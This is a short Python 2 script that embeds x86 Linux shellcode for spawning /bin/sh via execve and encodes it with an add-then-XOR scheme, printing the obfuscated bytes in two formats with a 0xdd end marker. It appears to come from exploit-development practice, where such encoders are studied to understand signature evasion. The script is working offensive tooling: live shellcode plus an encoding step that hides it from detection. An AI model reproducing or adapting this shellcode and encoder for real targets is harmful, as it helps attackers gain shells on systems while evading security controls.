#!/usr/bin/python

#Python Custom Encoder

#You are free to use and redistribute this code as you wish

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""
encoded2 = ""
for x in bytearray(shellcode):
	y = x + 0xa
	z = y^0xdd
	encoded += '\\x%02x' % z
	encoded2 += '0x%02x, ' % z

encoded += '\\xdd'
encoded2 += '0xdd'

print encoded
print encoded2
